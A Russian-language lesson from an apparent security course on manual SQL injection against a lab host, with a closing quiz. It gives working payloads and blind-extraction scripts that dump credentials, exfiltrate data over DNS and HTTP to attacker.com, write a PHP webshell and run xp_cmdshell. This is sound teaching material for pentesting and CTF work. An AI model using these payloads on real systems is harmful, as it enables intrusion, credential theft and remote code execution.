---
id: web-tool-sqli-manual
title: "Ручные SQL-инъекции: полный workflow без sqlmap"
category: web
parent: web-tools-sqli
difficulty: medium
order: 2
tags: [sqli, manual, union, blind, error-based, exploitation, scripting]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 60
summary: "Пошаговые ручные SQLi: найти инъекцию, посчитать колонки, UNION/error/boolean/time-blind извлечение, OOB и скриптинг."
---

sqlmap — отличный инструмент, но в реальном тесте он часто «не видит» инъекцию: нестандартный контекст, WAF, JSON/XML-тело, параметр в заголовке, вторая производная, слепая инъекция на медленном соединении. Умение сделать всё руками — это разница между «сканер ничего не нашёл» и найденным critical. Этот урок — пошаговый **workflow ручной SQLi**: от одиночной кавычки до дампа базы, с командами для каждой СУБД и скриптами для автоматизации.

Если нужен именно справочник по sqlmap — смотри `web-tool-sqlmap`. Здесь — как делать то же самое, когда автоматика не помогает.

## Шпаргалка: функции по СУБД

| Задача | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|--------|-------|-----------|-------|--------|--------|
| Комментарий | `#`, `-- ` | `-- ` | `-- ` | `-- ` | `-- ` |
| Конкатенация | `CONCAT(a,b)` | `a\|\|b` | `a+b` | `a\|\|b` | `a\|\|b` |
| Версия | `version()` | `version()` | `@@version` | `SELECT banner FROM v$version` | `sqlite_version()` |
| Текущая БД | `database()` | `current_database()` | `db_name()` | `SELECT ora_database_name FROM dual` | `—` |
| Текущий юзер | `user()` | `current_user` | `system_user` | `SELECT user FROM dual` | `—` |
| Список таблиц | `information_schema.tables` | `information_schema.tables` | `sysobjects` / `information_schema` | `all_tables` | `sqlite_master` |
| Ограничение строк | `LIMIT n OFFSET m` | `LIMIT n OFFSET m` | `TOP n` / `OFFSET` | `ROWNUM` | `LIMIT n OFFSET m` |
| Задержка | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message` | `randomblob(...)` |
| Error-based | `extractvalue()` / `updatexml()` | `cast(x as int)` | `convert(int,x)` | `utl_inaddr` / `ctxsys.drithsx` | — |
| Чтение файла | `LOAD_FILE()` | `pg_read_file()` | `OPENROWSET(BULK ...)` | `UTL_FILE` | — |
| RCE | `INTO OUTFILE` (webshell) | `COPY TO PROGRAM` | `xp_cmdshell` | `DBMS_SCHEDULER` | — |

## Почему руками: когда sqlmap не видит

| Причина | Что делать руками |
|---------|-------------------|
| Кастомный WAF режет payload'ы sqlmap | подбирать обфускацию вручную |
| Контекст в JSON/XML-вложенности | подставлять payload точнее, чем эвристика |
| Инъекция в заголовке (Host, XFF) | sqlmap требует `--level 5`, часто пропускает |
| Вторая производная (stored) | payload сохраняется и срабатывает в другом запросе |
| Слепая инъекция, сервер медленный | экономить запросы, использовать бинарный поиск |
| Нужно минимальное PoC | показать один чистый запрос |
| Полное отсутствие ответа | OOB через DNS/HTTP |

Навык ручной SQLi — обязательный: на CTF и bug bounty именно он приносит находки там, где сканеры слепы.

## Шаг 1. Обнаружение инъекции

Начинай с трёх простых проверок. Сравнивай **размер ответа** (`wc -c`) или видимую разницу.

```bash
# базовый ответ
curl -s 'http://lab.local/product?id=3' | wc -c          # 4200
# кавычка -> ошибка?
curl -s "http://lab.local/product?id=3'" | head -20
# удвоенная кавычка -> ошибки нет? (значит строковый контекст)
curl -s "http://lab.local/product?id=3''" | wc -c
# арифметика (числовой контекст)
curl -s "http://lab.local/product?id=3-1" | wc -c         # = ответ для id=2 ?
curl -s "http://lab.local/product?id=3+1" | wc -c
# булева логика
curl -s "http://lab.local/product?id=3 AND 1=1" | wc -c   # норма
curl -s "http://lab.local/product?id=3 AND 1=2" | wc -c   # пусто/другое
```

Что это даёт:

- `id=3'` → ошибка `You have an error in your SQL syntax` → **строковый** контекст, error-based возможен.
- `id=3''` → ошибки нет → кавычка просто экранируется.
- `id=3-1` отдаёт товар с `id=2` → **числовой** контекст, `AND 1=1` работает.
- `AND 1=1` (норма) vs `AND 1=2` (пусто) → **boolean-based** слепая инъекция.

Не забывай про параметры вне URL: cookie, `User-Agent`, `Referer`, `X-Forwarded-For`, JSON-поля, скрытые POST-поля.

```bash
curl -s 'http://lab.local/' -H "User-Agent: ' OR '1'='1"
curl -s 'http://lab.local/api' -H 'Content-Type: application/json' \
     --data '{"q":"1 AND 1=1"}'
```

## Шаг 2. Контекст и определение СУБД

Ошибки БД выдают движок. Это экономит весь дальнейший перебор.

| СУБД | Характерная строка ошибки |
|------|--------------------------|
| MySQL / MariaDB | `You have an error in your SQL syntax` |
| PostgreSQL | `ERROR: syntax error at or near` |
| MSSQL | `Unclosed quotation mark after the character string` / `Microsoft OLE DB` |
| Oracle | `ORA-00933: SQL command not properly ended` |
| SQLite | `SQLite3::query():` / `near "...": syntax error` |
| MS Access | `Microsoft JET Database Engine` |

Подтверждение версии и контекста:

```bash
# MySQL
curl -s "http://lab.local/product?id=3 AND 1=1-- -"      # работает
curl -s "http://lab.local/product?id=3 AND 1=1#"         # # = комментарий MySQL
# PostgreSQL: --  тоже комментарий, но || конкатенация
curl -s "http://lab.local/product?id=3'||'x"
# MSSQL: конкатенация через +
curl -s "http://lab.local/product?id=3'+'x"
```

Комментарии для обрезки остатка запроса:

| СУБД | Комментарий | Примечание |
|------|-------------|-----------|
| MySQL | `#`, `-- ` (пробел!), `/*...*/` | после `--` обязателен пробел |
| PostgreSQL | `-- `, `/*...*/` | |
| MSSQL | `-- `, `/*...*/` | |
| Oracle | `-- ` | |
| SQLite | `-- `, `/*...*/` | |

## Шаг 3. Число колонок: ORDER BY и UNION SELECT NULL

Два надёжных способа.

**A. ORDER BY** — увеличивай N, пока не появится ошибка:

```bash
curl -s "http://lab.local/product?id=3 ORDER BY 1-- -"   # ok
curl -s "http://lab.local/product?id=3 ORDER BY 2-- -"   # ok
curl -s "http://lab.local/product?id=3 ORDER BY 3-- -"   # ok
curl -s "http://lab.local/product?id=3 ORDER BY 4-- -"   # error -> 3 колонки
```

**B. UNION SELECT NULL** — надёжнее, если `ORDER BY` заглушён фильтром:

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL-- -"              # error
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,NULL-- -"         # error
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,NULL,NULL-- -"    # ok -> 3
```

Почему `id=-1` (или `id=0`): исходный запрос не находит строку, и в выводе остаётся только твой UNION-результат. Иначе данные смешаются.

## Шаг 4. Поиск колонок вывода

Часть колонок не отражается в HTML. Найди те, где виден твой маркер.

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT 1,2,3-- -"
# в HTML увидишь, скажем, "... 2 ..." -> вторая колонка отражается
```

Если маркеров не видно — они могут быть в атрибутах, alt, скрытых div. Ищи в исходнике:

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT 1111,2222,3333-- -" | grep -o '2222'
```

## UNION-based: извлечение данных

После того как найдены отражаемые колонки — вытаскивай всё. Помни про **несовпадение типов**: если колонка числовая, строку придётся кастовать (`CONCAT`/`CAST`).

**MySQL / MariaDB:**

```bash
# текущая база и пользователь
curl -s "http://lab.local/product?id=-1 UNION SELECT 1,database(),user()-- -"
# список таблиц
curl -s "http://lab.local/product?id=-1 UNION SELECT 1,group_concat(table_name),3 \
  FROM information_schema.tables WHERE table_schema=database()-- -"
# колонки таблицы users
curl -s "http://lab.local/product?id=-1 UNION SELECT 1,group_concat(column_name),3 \
  FROM information_schema.columns WHERE table_name=0x7573657273-- -"
# дамп
curl -s "http://lab.local/product?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 \
  FROM users-- -"
```

`0x7573657273` — hex-строка `users` (обход фильтра кавычек). `0x3a` — двоеточие-разделитель.

**PostgreSQL:**

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,string_agg(table_name,','),NULL \
  FROM information_schema.tables-- -"
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,string_agg(column_name,','),NULL \
  FROM information_schema.columns WHERE table_name='users'-- -"
```

**MSSQL:**

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -"
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,username+':'+password,NULL FROM users-- -"
```

**Oracle:** в `UNION` обязательны `FROM dual`, а каждая колонка должна иметь тип.

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT NULL,table_name,NULL FROM all_tables-- -"
```

## Error-based: extractvalue, updatexml, CAST

Когда колонки вывода найти не удалось, а ошибки БД видны — используй их как канал. Самый быстрый способ дампа без слепых запросов.

**MySQL 5.1+:**

```bash
# extractvalue возвращает данные прямо в тексте ошибки
curl -s "http://lab.local/product?id=3 AND extractvalue(1,concat(0x7e,database()))-- -"
# ~appdb

# вытащить список таблиц (лимит ~32 символа, поэтому через substring)
curl -s "http://lab.local/product?id=3 AND extractvalue(1,concat(0x7e,( \
  SELECT group_concat(table_name) FROM information_schema.tables \
  WHERE table_schema=database())))-- -"
```

`updatexml` — альтернатива (тоже лимит 32 символа):

```bash
curl -s "http://lab.local/product?id=3 AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -"
```

Для длинных значений — посимвольно:

```bash
for i in $(seq 1 40); do
  curl -s "http://lab.local/product?id=3 AND extractvalue(1,concat(0x7e,( \
    SELECT substr(group_concat(table_name),$i,1) FROM information_schema.tables \
    WHERE table_schema=database())))-- -" | grep -o '~.'
done
```

**PostgreSQL / MSSQL:** error-based через приведение типа:

```bash
# PostgreSQL: cast ошибки
curl -s "http://lab.local/product?id=3 AND 1=cast((SELECT version()) as int)-- -"
# MSSQL: convert/ctxsys
curl -s "http://lab.local/product?id=3 AND 1=convert(int,(SELECT @@version))-- -"
```

## Boolean-based blind: пошагово

Ответ не меняется по содержанию, но различается «истина/ложь». Извлекаем данные **побитово/посимвольно**, сравнивая два ответа.

Сначала определи признак «истины». Например, страница с товаром длиннее пустой:

```bash
curl -s "http://lab.local/product?id=3 AND 1=1" | wc -c   # 4200  <- TRUE
curl -s "http://lab.local/product?id=3 AND 1=2" | wc -c   # 100   <- FALSE
```

Теперь задаём вопросы БД:

```bash
# первый символ имени базы > 'm' ?
curl -s "http://lab.local/product?id=3 AND substr(database(),1,1)>'m'" | wc -c
# бинарный поиск по ASCII-коду
curl -s "http://lab.local/product?id=3 AND ascii(substr(database(),1,1))>109" | wc -c
```

Скрипт для дампа строки (bash + curl, бинарный поиск символа):

```bash
#!/bin/bash
URL='http://lab.local/product?id=3'
t() { # $1 = SQL-условие; возвращает 0 если TRUE
  local n; n=$(curl -s "$URL%20AND%20$1" | wc -c)
  [ "$n" -gt 1000 ]
}
dump() { # $1 = SQL-выражение (одна строка)
  local pos c lo hi mid out=""
  for pos in $(seq 1 40); do
    lo=32; hi=126; c=0
    while [ $lo -le $hi ]; do
      mid=$(( (lo+hi)/2 ))
      if t "ascii(substr(($1),$pos,1))>$mid"; then lo=$((mid+1)); c=$mid; else hi=$((mid-1)); fi
    done
    c=$((c+1)); [ "$c" -le 32 ] && break
    out="$out$(printf "\\$(printf '%03o' $c)")"
  done
  echo "$out"
}
dump "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
```

Такой скрипт делает ~7 запросов на символ вместо ~95 при линейном переборе — критично на медленных целях.

## Time-based blind: SLEEP, pg_sleep, WAITFOR

Когда ответ вообще не меняется — единственный канал это **время**. Задержка = «истина».

| СУБД | Payload |
|------|---------|
| MySQL | `AND IF(1=1,SLEEP(5),0)` |
| MySQL (альт.) | `AND (SELECT 1 FROM (SELECT SLEEP(5))a)` |
| PostgreSQL | `AND 1=(SELECT 1 FROM pg_sleep(5))` |
| MSSQL | `; WAITFOR DELAY '0:0:5'-- -` |
| Oracle | `AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',5)=1)` |
| SQLite | `AND 1=randomblob(100000000)` |

Проверка:

```bash
time curl -s "http://lab.local/product?id=3 AND SLEEP(5)-- -" >/dev/null
# реальное время > 5s -> инъекция есть
```

Извлечение (тот же бинарный поиск, но по времени):

```bash
t() { # TRUE если запрос занял > 3s
  local s e; s=$(date +%s)
  curl -s --max-time 20 "http://lab.local/product?id=3 AND IF($1,SLEEP(3),0)-- -" >/dev/null
  e=$(date +%s); [ $((e-s)) -ge 3 ]
}
t "ascii(substr(database(),1,1))>109" && echo ">m" || echo "<=m"
```

На каждое сравнение — минимум `SLEEP` секунд, поэтому бинарный поиск обязателен. Ещё быстрее — вытягивать по **битам** через `ASCII` и делить пополам.

## Out-of-band: DNS и HTTP exfil

Когда ответ не меняется и время не работает (например, кэш), данные уходят на **твой** сервер.

**MySQL (Windows, UNC):**

```bash
curl -s "http://lab.local/product?id=3 AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\x'))-- -"
# в DNS-логе Burp Collaborator / interactsh увидишь appdb.attacker.com
```

**MSSQL:** `xp_dirtree`/`xp_fileexist` по UNC-пути, DNS-запрос наружу. Либо OLE Automation с `MSXML2.ServerXMLHTTP`:

```bash
curl -s "http://lab.local/product?id=3; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\x'-- -"
```

**PostgreSQL:** расширение `dblink`/`COPY ... TO PROGRAM` для HTTP-запроса. Требует прав.

```bash
curl -s "http://lab.local/product?id=3'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'\$(whoami)-- -"
```

Для приёма используй `interactsh-client` или свой DNS-сервер + `tcpdump`:

```bash
interactsh-client -v
tcpdump -ni eth0 udp port 53
```

## Stacked queries, файлы и RCE через БД

**Stacked queries** (несколько запросов через `;`) поддерживают MSSQL, PostgreSQL, MySQL (зависит от драйвера). Это открывает запись файлов и RCE.

**MySQL — чтение/запись файлов** (нужны `FILE`-привилегии и `secure_file_priv`):

```bash
curl -s "http://lab.local/product?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
curl -s "http://lab.local/product?id=3 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 \
  INTO OUTFILE '/var/www/html/sh.php'-- -"
```

**PostgreSQL — RCE через COPY TO PROGRAM:**

```bash
curl -s "http://lab.local/product?id=3'; COPY (SELECT '') TO PROGRAM 'id > /tmp/o'-- -"
```

**MSSQL — xp_cmdshell:**

```bash
curl -s "http://lab.local/product?id=3'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; \
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -"
```

Это destructive-ish операции: на реальном пентесте согласуй, на CTF — стандартный путь к RCE.

## Автоматизация: скрипты вместо ручного перебора

Ручной перебор одного символа терпим, базы — нет. Минимальный Python-скрипт для boolean-blind:

```python
import requests, string

URL = "http://lab.local/product"
S = requests.Session()
TRUE = 4200  # размер ответа при истине

def cond(sql):
    r = S.get(URL, params={"id": f"3 AND ({sql})"}, timeout=10)
    return len(r.content) >= TRUE - 50

def extract(expr, maxlen=64):
    out = ""
    for pos in range(1, maxlen + 1):
        lo, hi, found = 32, 126, 0
        while lo <= hi:
            mid = (lo + hi) // 2
            if cond(f"ascii(substr(({expr}),{pos},1))>{mid}"):
                lo, found = mid + 1, mid
            else:
                hi = mid - 1
        ch = found + 1
        if ch <= 32:
            break
        out += chr(ch)
    return out

print(extract("SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"))
```

Для time-based меняется только функция `cond`: замеряй `elapsed` и возвращай `elapsed > delay`. Для UNION/error-based скрипт вообще не нужен — данные приходят в ответе.

Готовые помощники: `sqlmap` (см. `web-tool-sqlmap`), `ghauri`, `sqlmapapi`, либо Burp Intruder с payload-позициями (см. урок про фаззеры).

## Справочник функций по СУБД

Ниже — «таблица штурмана» для каждой СУБД: что подставить, когда нужно извлечь конкретный тип данных.

### MySQL / MariaDB

| Назначение | Функция / синтаксис | Пример |
|-----------|---------------------|--------|
| Версия | `@@version`, `version()` | `UNION SELECT 1,@@version,3` |
| Текущая БД | `database()`, `schema()` | `UNION SELECT 1,database(),3` |
| Текущий юзер | `user()`, `current_user()`, `system_user()` | `UNION SELECT 1,user(),3` |
| Хост/порт | `@@hostname`, `@@port` | |
| Список БД | `information_schema.schemata` | `SELECT schema_name FROM information_schema.schemata` |
| Список таблиц | `information_schema.tables` | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| Колонки | `information_schema.columns` | `... WHERE table_name=0x7573657273` |
| Конкатенация | `CONCAT(a,b)`, `CONCAT_WS(0x3a,a,b)` | `CONCAT(username,0x3a,password)` |
| Групповая агрегация | `GROUP_CONCAT(x SEPARATOR 0x2c)` | `GROUP_CONCAT(table_name)` |
| Подстрока | `SUBSTR(s,pos,len)`, `MID()`, `LEFT()`, `RIGHT()` | `SUBSTR(database(),1,1)` |
| Длина | `LENGTH(s)` | `LENGTH(database())` |
| ASCII/символ | `ASCII(s)`, `ORD(s)`, `CHAR(n)` | `ASCII(SUBSTR(...,1,1))` |
| Hex | `HEX(s)`, `UNHEX(h)`, `0x...` | `0x3a` = `:` |
| Регистр/обрезка | `LOWER()`, `UPPER()`, `TRIM()` | |
| Комментарий | `#`, `-- ` (пробел), `/*...*/` | `id=1-- -` |
| Задержка | `SLEEP(n)`, `BENCHMARK(n,expr)` | `AND SLEEP(5)` |
| Error-based | `extractvalue(1,CONCAT(0x7e,x))`, `updatexml(1,CONCAT(0x7e,x),1)` | `AND extractvalue(1,concat(0x7e,database()))` |
| Чтение файла | `LOAD_FILE(path)` | `UNION SELECT 1,LOAD_FILE('/etc/passwd'),3` |
| Запись файла | `INTO OUTFILE`, `INTO DUMPFILE` | `... INTO OUTFILE '/var/www/sh.php'` |
| Строка без кавычек | hex `0x...` | `table_name=0x7573657273` |
| Обход пробела | `/**/`, `+`, `%09` | `AND/**/1=1` |

### PostgreSQL

| Назначение | Функция / синтаксис | Пример |
|-----------|---------------------|--------|
| Версия | `version()` | `UNION SELECT NULL,version(),NULL` |
| Текущая БД | `current_database()` | |
| Текущий юзер | `current_user`, `session_user` | |
| Список таблиц | `information_schema.tables`, `pg_catalog.pg_tables` | `SELECT table_name FROM information_schema.tables` |
| Колонки | `information_schema.columns` | |
| Конкатенация | `\|\|`, `concat(a,b)`, `concat_ws()` | `'a'\|\|'b'` |
| Агрегация | `string_agg(x, ',')` | `string_agg(table_name,',')` |
| Подстрока | `substr(s,pos,len)`, `substring()` | |
| ASCII | `ascii(s)`, `chr(n)` | |
| Комментарий | `-- `, `/*...*/` | |
| Задержка | `pg_sleep(n)` | `AND 1=(SELECT 1 FROM pg_sleep(5))` |
| Error-based | `cast(x as int)` | `AND 1=cast((SELECT version()) as int)` |
| Чтение файла | `pg_read_file()`, `pg_ls_dir()` | `pg_read_file('/etc/passwd')` |
| RCE | `COPY (SELECT '') TO PROGRAM 'cmd'` | `COPY (SELECT '') TO PROGRAM 'id'` |
| Stacked queries | `;` | `'; COPY ...--` |
| Обход кавычек | `chr(n)`, `$$...$$` | `$$users$$` |

### MSSQL

| Назначение | Функция / синтаксис | Пример |
|-----------|---------------------|--------|
| Версия | `@@version` | `UNION SELECT NULL,@@version,NULL` |
| Текущая БД | `db_name()` | |
| Текущий юзер | `system_user`, `user_name()`, `suser_sname()` | |
| Хост | `@@servername`, `HOST_NAME()` | |
| Список таблиц | `sysobjects` (`xtype='U'`), `information_schema.tables` | `SELECT name FROM sysobjects WHERE xtype='U'` |
| Колонки | `syscolumns`, `information_schema.columns` | |
| Конкатенация | `+` | `username+':'+password` |
| Подстрока | `substring(s,pos,len)` | |
| ASCII | `ascii(s)`, `char(n)` | |
| Комментарий | `-- `, `/*...*/` | |
| Задержка | `WAITFOR DELAY '0:0:5'` | `; WAITFOR DELAY '0:0:5'--` |
| Error-based | `convert(int,x)`, `cast(x as int)` | `AND 1=convert(int,@@version)` |
| Чтение файла | `OPENROWSET(BULK 'path', SINGLE_CLOB)` | |
| OOB (DNS) | `xp_dirtree`, `xp_fileexist` | `EXEC master..xp_dirtree '\\attacker\x'` |
| RCE | `xp_cmdshell` | `EXEC xp_cmdshell 'whoami'` |
| Включить xp_cmdshell | `sp_configure` + `RECONFIGURE` | см. пример выше |
| Stacked queries | `;` | |

### Oracle

| Назначение | Функция / синтаксис | Пример |
|-----------|---------------------|--------|
| Версия | `SELECT banner FROM v$version` | `UNION SELECT NULL,banner,NULL FROM v$version` |
| Текущая БД | `SELECT ora_database_name FROM dual` | |
| Текущий юзер | `SELECT user FROM dual` | |
| Список таблиц | `all_tables`, `user_tables` | `SELECT table_name FROM all_tables` |
| Колонки | `all_tab_columns` | `SELECT column_name FROM all_tab_columns` |
| Конкатенация | `\|\|` | `'a'\|\|'b'` |
| Подстрока | `substr(s,pos,len)` | |
| Комментарий | `-- ` | |
| Обязателен `FROM dual` | любая выборка констант | `SELECT 1 FROM dual` |
| Задержка | `dbms_pipe.receive_message('a',5)` | `AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',5)=1)` |
| Error-based | `utl_inaddr.get_host_address(...)`, `ctxsys.drithsx.sn(...)` | `AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))` |
| OOB (DNS) | `utl_inaddr`, `utl_http` | `utl_inaddr.get_host_address('attacker')` |
| Чтение/запись файла | `UTL_FILE` | |
| RCE | `DBMS_SCHEDULER.create_job` | |
| Stacked queries | **не поддерживаются** в большинстве | |

### SQLite

| Назначение | Функция / синтаксис | Пример |
|-----------|---------------------|--------|
| Версия | `sqlite_version()` | `UNION SELECT 1,sqlite_version()` |
| Список таблиц | `sqlite_master` | `SELECT name FROM sqlite_master WHERE type='table'` |
| DDL таблицы | `sqlite_master.sql` | `SELECT sql FROM sqlite_master` |
| Конкатенация | `\|\|` | `'a'\|\|'b'` |
| Подстрока | `substr(s,pos,len)` | |
| Комментарий | `-- `, `/*...*/` | |
| Задержка | `randomblob(N)` | `AND 1=randomblob(100000000)` |
| Особенности | нет `information_schema`, нет сетевых функций | |

## Частые ошибки

- **Забыть про `-- -` / пробел после `--`.** Без завершающего комментария остаток запроса ломает payload.
- **Не найти отражаемую колонку.** UNION работает, но данных не видно — значит, выбрана не та колонка или она в скрытом месте.
- **Игнорировать несовпадение типов.** В числовой колонке строка даст ошибку — кастуй через `CAST`/`CONCAT`.
- **Линейный перебор в blind.** 95 запросов на символ убьют цель и время; используй бинарный поиск.
- **Забыть `id=-1`.** Иначе вывод смешается с легитимной строкой и данные не прочитать.
- **Путать `#` и `--`.** `#` — только MySQL; `--` требует пробела после него во всех СУБД.
- **Тестировать только `id`.** Инъекция часто в cookie, `X-Forwarded-For`, `ORDER BY`-параметре, JSON-поле.
- **Не сохранять PoC.** Каждый шаг фиксируй минимальным curl-запросом — это и доказательство, и база для отчёта.

## Квиз

```quiz
- question: "Параметр `id=3 ORDER BY 4` даёт ошибку, а `ORDER BY 3` — нет. Сколько колонок в запросе?"
  options:
    - "2"
    - "3"
    - "4"
    - "5"
  answer: 1
  explanation: "Ошибка на N+1 означает N колонок; ORDER BY 4 упал -> 3."
- question: "Какая функция MySQL даёт error-based вывод данных прямо в тексте ошибки?"
  options:
    - "SLEEP()"
    - "extractvalue()"
    - "group_concat()"
    - "pg_sleep()"
  answer: 1
  explanation: "extractvalue/updatexml возвращают данные в сообщении об ошибке."
- question: "Чем отличается time-based blind от boolean-based blind?"
  options:
    - "Time-based использует задержку как канал истины, boolean — разницу в ответе"
    - "Boolean работает только в MSSQL"
    - "Time-based не требует инъекции"
    - "Они идентичны"
  answer: 0
  explanation: "В time-based истина кодируется задержкой (SLEEP/pg_sleep/WAITFOR)."
- question: "Зачем в UNION-payload ставить `id=-1`?"
  options:
    - "Чтобы ускорить запрос"
    - "Чтобы исходная строка не нашлась и вывод содержал только UNION-результат"
    - "Чтобы обойти WAF"
    - "Чтобы получить RCE"
  answer: 1
  explanation: "Несуществующий id очищает вывод от легитимных данных."
- question: "Какой канал использовать, если ответ не меняется ни по содержимому, ни по времени?"
  options:
    - "UNION-based"
    - "Error-based"
    - "Out-of-band (DNS/HTTP exfil)"
    - "Никакой, инъекции нет"
  answer: 2
  explanation: "OOB уводит данные на твой сервер через DNS/HTTP-запрос."
```

## Где пригодится

- **CTF (Web):** ручная SQLi — обязательный навык; WAF и нестандартные контексты часто требуют именно ручного подхода.
- **Bug bounty:** минимальный PoC-запрос и обход фильтров вручную повышают шанс, что триажер примет баг как critical.
- **Пентест:** когда сканер молчит, ручной workflow находит blind/OOB-инъекции, которые он пропускает.
- **Работа (AppSec):** понимание ручной эксплуатации помогает точно оценивать риск находок и писать понятные рекомендации разработчикам.
